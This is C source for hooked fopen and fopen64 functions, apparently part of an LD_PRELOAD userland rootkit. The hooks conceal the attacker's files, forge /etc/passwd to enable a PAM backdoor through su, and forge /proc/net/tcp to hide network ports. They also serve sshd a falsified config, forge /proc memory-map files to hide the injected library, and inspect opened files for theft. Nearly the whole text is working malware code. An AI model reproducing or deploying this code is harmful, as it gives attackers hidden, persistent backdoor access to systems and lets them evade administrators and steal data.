FILE *fopen(const char *pathname, const char *mode){
    hook(CFOPEN);

#ifdef USE_PAM_BD
    if(hidden_ppid() && process("su\0") && !strcmp(pathname, "/etc/passwd\0"))
        return forgepasswd(pathname);
#endif

    if(magicusr()){
#ifdef HIDE_MY_ASS
        FILE *ret = call(CFOPEN, pathname, mode);
        if(ret){
            int outfd = fileno(stdout);
            if(!outfd) return ret;
            if(isatty(outfd))
                if(!pathtracked(pathname))
                    trackwrite(pathname);
        }
        return ret;
#else
        return call(CFOPEN, pathname, mode);
#endif
    }

    if(hidden_path(pathname)){
        errno = ENOENT;
        return NULL;
    }

#ifdef HIDE_PORTS
    if(!strcmp(pathname, "/proc/net/tcp") || !strcmp(pathname, "/proc/net/tcp6"))
        return forge_procnet(pathname);
#endif

#ifdef SOFT_PATCH_SSHD_CONFIG
    if(!strcmp(pathname, "/etc/ssh/sshd_config\0") && sshdproc())
        return sshdforge(pathname);
#endif

#ifdef FORGE_MAPS
    if(!fnmatch(MAPS_FULL_PATH, pathname, FNM_PATHNAME)) return forge_maps(pathname);
    if(!fnmatch(SMAPS_FULL_PATH, pathname, FNM_PATHNAME)) return forge_smaps(pathname);
    if(!fnmatch(NMAPS_FULL_PATH, pathname, FNM_PATHNAME)) return forge_numamaps(pathname);

    char cwd[PROCPATH_MAXLEN];
    if(getcwd(cwd, sizeof(cwd)) != NULL){
        if(!strcmp(cwd, "/proc")){
            if(!fnmatch(MAPS_PROC_PATH, pathname, FNM_PATHNAME)) return forge_maps(pathname);
            if(!fnmatch(SMAPS_PROC_PATH, pathname, FNM_PATHNAME)) return forge_smaps(pathname);
            if(!fnmatch(NMAPS_PROC_PATH, pathname, FNM_PATHNAME)) return forge_numamaps(pathname);
        }

        if(!fnmatch("/proc/*", cwd, FNM_PATHNAME)){
            if(!fnmatch(MAPS_FILENAME, pathname, FNM_PATHNAME)) return forge_maps(pathname);
            if(!fnmatch(SMAPS_FILENAME, pathname, FNM_PATHNAME)) return forge_smaps(pathname);
            if(!fnmatch(NMAPS_FILENAME, pathname, FNM_PATHNAME)) return forge_numamaps(pathname);
        }
    }
#endif

#ifdef FILE_STEAL
    inspectfile(pathname);
#endif
    return call(CFOPEN, pathname, mode);
}




FILE *fopen64(const char *pathname, const char *mode){
    hook(CFOPEN64);

#ifdef USE_PAM_BD
    if(hidden_ppid() && process("su\0") && !strcmp(pathname, "/etc/passwd\0"))
        return forgepasswd(pathname);
#endif

    if(magicusr()){
#ifdef HIDE_MY_ASS
        FILE *ret = call(CFOPEN64, pathname, mode);
        if(ret){
            int outfd = fileno(stdout);
            if(!outfd) return ret;
            if(isatty(outfd))
                if(!pathtracked(pathname))
                    trackwrite(pathname);
        }
        return ret;
#else
        return call(CFOPEN64, pathname, mode);
#endif
    }

    if(hidden_path(pathname)){
        errno = ENOENT;
        return NULL;
    }

#ifdef HIDE_PORTS
    if(!strcmp(pathname, "/proc/net/tcp") || !strcmp(pathname, "/proc/net/tcp6"))
        return forge_procnet(pathname);
#endif

#ifdef SOFT_PATCH_SSHD_CONFIG
    if(!strcmp(pathname, "/etc/ssh/sshd_config\0") && sshdproc())
        return sshdforge(pathname);
#endif

#ifdef FORGE_MAPS
    if(!fnmatch(MAPS_FULL_PATH, pathname, FNM_PATHNAME)) return forge_maps(pathname);
    if(!fnmatch(SMAPS_FULL_PATH, pathname, FNM_PATHNAME)) return forge_smaps(pathname);
    if(!fnmatch(NMAPS_FULL_PATH, pathname, FNM_PATHNAME)) return forge_numamaps(pathname);

    char cwd[PROCPATH_MAXLEN];
    if(getcwd(cwd, sizeof(cwd)) != NULL){
        if(!strcmp(cwd, "/proc")){
            if(!fnmatch(MAPS_PROC_PATH, pathname, FNM_PATHNAME)) return forge_maps(pathname);
            if(!fnmatch(SMAPS_PROC_PATH, pathname, FNM_PATHNAME)) return forge_smaps(pathname);
            if(!fnmatch(NMAPS_PROC_PATH, pathname, FNM_PATHNAME)) return forge_numamaps(pathname);
        }

        if(!fnmatch("/proc/*", cwd, FNM_PATHNAME)){
            if(!fnmatch(MAPS_FILENAME, pathname, FNM_PATHNAME)) return forge_maps(pathname);
            if(!fnmatch(SMAPS_FILENAME, pathname, FNM_PATHNAME)) return forge_smaps(pathname);
            if(!fnmatch(NMAPS_FILENAME, pathname, FNM_PATHNAME)) return forge_numamaps(pathname);
        }
    }
#endif

#ifdef FILE_STEAL
    inspectfile(pathname);
#endif
    return call(CFOPEN64, pathname, mode);
}
